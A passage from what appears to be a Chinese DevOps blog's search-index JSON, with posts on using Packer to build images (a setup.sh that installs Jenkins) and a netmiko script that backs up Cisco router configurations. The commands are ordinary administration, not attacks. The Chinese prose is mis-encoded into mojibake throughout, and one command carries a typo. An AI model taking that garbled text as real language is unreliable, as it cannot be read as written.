\u0026#34;out.json\u0026#34; } ] } å¤§å·®ä¸å·®å§ã€‚\nè¯¦ç»†å‚æ•°å¯ä»¥å»çœ‹ï¼šhttps://www.packer.io/plugins/builders/tencentcloud\né‚£æœ€åå°±æ˜¯setup.shäº†ï¼Œä¸¾ä¾‹è£…ä¸ªjenkinså¥½äº†ï¼Œå…¶ä»–çš„å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œæ³¨å…¥ï¼š\nsleep 30 sudo yum update â€“y sudo wget -O /etc/yum.repos.d/jenkins.repo \\ https://pkg.jenkins.io/redhat-stable/jenkins.repo sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key sudo yum upgrade sudo yum instqll -y epel-release sudo yum install java-openjdk11 -y sudo yum install jenkins -y sudo systemctl enable jenkins sudo systemctl start jenkins sudo systemctl status jenkins æœ€årunä¸€ä¸‹ï¼š\npacker build -var-file=\u0026#34;variable.json\u0026#34; packer.json å½å“©å’•å™œä¸€é¡¿ï¼Œå°±buildå¥½äº†\nOverï¼Œè¿™ä¸ªå·¥å…·åœ¨IASä¸­æ˜¯ä¸å¯ç¼ºå°‘çš„ä¸€ç¯ã€‚\n","permalink":"https://rendoumi.com/posts/20220717-terraform/","summary":"\u003cp\u003eå…ˆæ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒInfrastructure as Codeï¼Œä¹Ÿå°±æ˜¯ä»ä»£ç å¼€å§‹å®šä¹‰æ•´ä¸ªç½‘ç»œç¯å¢ƒã€è™šæœºã€å„ç§èµ„æºç­‰ç­‰ã€‚\u003c/p\u003e\n\u003cp\u003eç®€å•è¯´å°±æ˜¯åœ¨äº‘ä¸Šç”¨ä»£ç æ¥ç®¡ç†ä¸€åˆ‡ï¼Œæ— è®ºæ˜¯vpcã€subnetworkã€lbã€snatã€sgã€ec2\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003eéå¸¸ç¬¦åˆæˆ‘çš„èƒƒå£ï¼Œå› ä¸ºå°±è¿æ¶æ„å›¾ï¼Œéƒ½æ˜¯ç”¨ graphviz æ¥ç”»çš„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆ Infrastructure as Code ï¼ˆIACï¼‰ å¯ä»¥åˆ†ä¸ºä»¥ä¸‹äº”ä¸ªéƒ¨åˆ†ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAd hoc scripts\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfiguration Management tools\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOrchestration tools\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProvisioning tools\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eServer Templating tools\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"ä¸€ad-hoc-scripts\"\u003eä¸€ã€Ad hoc scripts\u003c/h4\u003e\n\u003cp\u003eå°±æ˜¯ç”¨è½¯ä»¶å¯¹ç›®çš„ä¸»æœºè¿›è¡Œ point to point æ“ä½œï¼Œç”¨shellæˆ–è€…ansibleéƒ½å¯ä»¥ã€‚æ¨èansibleã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨ infosys é¢è¯•è¢«ä¸€ä¸ªå°åº¦è€å¤–é—®åˆ°è¿™é—®é¢˜ï¼Œå› ä¸ºå¹³æ—¶æ ¹æœ¬ä¸ç”¨ansible çš„ ad hoc ç‚¹å¯¹ç‚¹æ¨¡å¼ï¼Œç»“æœè¢«å½“åœºé—®ä½ã€‚ç°åœ¨æ‰çŸ¥é“è¿™ç©æ„æ˜¯ä»€ä¹ˆã€‚å½“ç„¶ï¼Œç”¨ ansible çš„è¯ä¸å»ºè®®ç”¨è¿™ä¸ªï¼Œå› ä¸º playbook æ˜¯å¯è¿½æº¯çš„ã€‚\u003c/p\u003e\n\u003ch4 id=\"äºŒconfiguration-management-tools\"\u003eäºŒã€Configuration Management tools\u003c/h4\u003e\n\u003cp\u003eé…ç½®ç®¡ç†ï¼Œè¿™é‡Œå½“ç„¶æ¨è ansibleï¼Œæ¯ä¸€æ­¥çš„æ“ä½œéƒ½å¯ä»¥æœ‰ inventory å’Œ playbook å¯ä»¥è¿½æº¯ã€‚\u003c/p\u003e\n\u003ch4 id=\"ä¸‰orchestration-tools\"\u003eä¸‰ã€Orchestration tools\u003c/h4\u003e\n\u003cp\u003eååŒå·¥å…·ï¼Œk8så’Œkvm\u003c/p\u003e\n\u003ch4 id=\"å››provisioning-tools\"\u003eå››ã€Provisioning tools\u003c/h4\u003e\n\u003cp\u003eç”Ÿäº§å·¥å…·ï¼Œå½“ç„¶æ˜¯terraformï¼Œå¦å¤–ï¼Œé˜¿é‡Œäº‘æ˜¯æ”¯æŒplumiçš„ï¼Œåä¸ºè…¾è®¯ä¸æ”¯æŒã€‚\u003c/p\u003e\n\u003ch4 id=\"äº”server-templating-tools\"\u003eäº”ã€Server Templating tools\u003c/h4\u003e\n\u003cp\u003eæ¨¡æ¿å·¥å…·ï¼Œè¿™é‡Œå°±æ˜¯ Packerï¼Œå…¶å®æˆ‘ä»¬å…¬å¸ç°åœ¨çš„æ¨¡æ¿å·¥å…·ï¼Œæ˜¯å…«æˆ’ä»openstackå­¦çš„ï¼Œæ”¹åŠ¨Cloud-initçš„ä¸œè¥¿ã€‚\u003c/p\u003e\n\u003cp\u003ePackeræ›´æ ‡å‡†ä¸€ä¸‹ï¼Œæ˜¯è¿›åŒ–ç‰ˆçš„ä¸œè¥¿ï¼Œå®ƒæ—¢å¯ä»¥æ‰“kvmé•œåƒï¼Œä¹Ÿå¯ä»¥æ‰“Dockeré•œåƒã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢æˆ‘ä»¬å°±çœ‹çœ‹æ€ä¹ˆä½¿ç”¨å§ï¼Œè¿™é‡Œå…ˆè¯´kvmï¼Œå› ä¸ºkvmçš„æ¯”è¾ƒéš¾ï¼Œdockerçš„å…«æˆ’ç°åœ¨è¿˜æ˜¯ç”¨Dockerfileï¼Œæœ‰ç©ºäº†å†ç ”ç©¶packerï¼š\u003c/p\u003e\n\u003cp\u003eå®‰è£…å°±ä¸å¤šè¯´äº†ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å°±è¡Œï¼Œä¸ç”¨è£…ã€‚\u003c/p\u003e\n\u003cp\u003ePackerçš„æ ¸å¿ƒæ˜¯ä¸‰ä¸ªéƒ¨åˆ†\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ebuilders\u003c/li\u003e\n\u003cli\u003eprovisioners\u003c/li\u003e\n\u003cli\u003epost-processors\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªç©ºç›®å½•ï¼Œåå­—éšä¾¿ï¼Œå°±å« test-image\u003c/p\u003e","title":"Infrastructure as Codeä¸­packerçš„ä½¿ç”¨"},{"content":"åœ¨æ—¥å¸¸å·¥ä½œä¸­æˆ‘ä»¬ç»å¸¸è¦å¯¹ Cisco çš„ç½‘ç»œè®¾å¤‡çš„é…ç½®è¿›è¡Œå¤‡ä»½ï¼Œæˆ–è€…å’Œ suricata è”åŠ¨çš„æ—¶å€™è¦æ‰§è¡Œæ“ä½œã€‚\næ–¹æ³•å…¶å®å¾ˆç®€å•ï¼Œè°ƒç”¨ python çš„ç›¸åº”æ¨¡å—å³å¯ã€‚\nå‡†å¤‡å·¥ä½œå¦‚ä¸‹ï¼š\né¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½ python 3.6, pip install netmiko\nå…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç \nç„¶åä¾æ¬¡æ‰§è¡Œå¤‡ä»½å°±å¯ä»¥äº†ã€‚\n#!/export/servers/python363/bin/python3.6 from netmiko import Netmiko import time tw_bgp = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-bgp\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.10\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;secret\u0026#34; : \u0026#34;xxxxxxxx\u0026#34;, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.11\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.12\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.13\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.14\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } devices=[tw_bgp, tw_r1_e1, tw_r1_e2, tw_r2_e1, tw_r2_e2] for dev in devices: name = dev[\u0026#34;ip\u0026#34;] connection = Netmiko(**dev) connection.enable() out = connection.send_command(\u0026#34;show running-config\u0026#34;) calender = time.strftime(\u0026#34;%Y%m%d\u0026#34;) file_name = \u0026#39;{}-{}.txt\u0026#39;.format(dev[\u0026#34;host\u0026#34;],calender) file = open(file_name ,\u0026#34;w\u0026#34;) file.write(out) file.close() connection.disconnect() print(\u0026#34;BACKUP for %s done\u0026#34; %dev[\u0026#34;host\u0026#34;]) ","permalink":"https://rendoumi.com/posts/20220717-backup_cisco/","summary":"\u003cp\u003eåœ¨æ—¥å¸¸å·¥ä½œä¸­æˆ‘ä»¬ç»å¸¸è¦å¯¹ Cisco çš„ç½‘ç»œè®¾å¤‡çš„é…ç½®è¿›è¡Œå¤‡ä»½ï¼Œæˆ–è€…å’Œ suricata è”åŠ¨çš„æ—¶å€™è¦æ‰§è¡Œæ“ä½œã€‚\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•å…¶å®å¾ˆç®€å•ï¼Œè°ƒç”¨ python çš„ç›¸åº”æ¨¡å—å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eå‡†å¤‡å·¥ä½œå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½ python 3.6,  pip install netmiko\u003c/p\u003e\n\u003cp\u003eå…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç \u003c/p\u003e\n\u003cp\u003eç„¶åä¾æ¬¡æ‰§è¡Œå¤‡ä»½å°±å¯ä»¥äº†ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/export/servers/python363/bin/python3.6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003enetmiko\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-bgp\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.10\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;secret\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.11\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.12\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.14\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan 